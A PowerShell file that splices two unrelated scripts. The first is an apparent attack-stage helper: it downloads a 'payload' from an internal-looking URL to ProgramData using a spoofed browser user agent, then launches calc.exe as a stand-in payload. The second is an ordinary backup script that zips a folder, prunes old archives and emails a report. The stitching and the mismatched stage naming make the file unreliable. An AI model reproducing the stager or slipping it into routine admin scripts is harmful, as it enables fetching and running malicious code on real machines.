<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://internal.corp:8080/stage1.ps1",
    [string]$Stage2Path = 'C:\ProgramData\payload.bin',
    [int]$RequestTimeout = 53,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $FetchResult = Invoke-PayloadFetch -SourceUrl $DownloadUrl -DestinationPath $Stage2Path -TimeoutSec $RequestTimeout -UserAgent $BrowserAgent
    if ($FetchResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 22
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.DESCRIPTION
    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
    retention window to the archive folder.
    Only files below the configured backup root are pruned, so a mistyped
    retention value cannot reach outside the archive directory.
.PARAMETER SourcePath
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Start-AppBackup.ps1 -RetentionDays 60
#>

param(
    [string]$SourcePath = 'D:\Apps\Infra.Agent',

    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BackupRoot = 'D:\Backups\Agent',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 60,
    [ValidateSet('Optimal', "Fastest", 'NoCompression')]
    [string]$CompressionLevel = 'Optimal',
    [int]$MinFreeGB = 10,
    [switch]$DryRun
)

$InformationPreference = 'SilentlyContinue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 5 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List
$MailTo = "backup-ops@contoso.com"
$MailFrom = 'backup@contoso.com'
$mailBody = ("Archive: {0} ({1} MB)" -f $archive, $manifest.SizeMB)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Backup completed"
    Body       = $mailBody
    SmtpServer = 'smtp.contoso.com'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
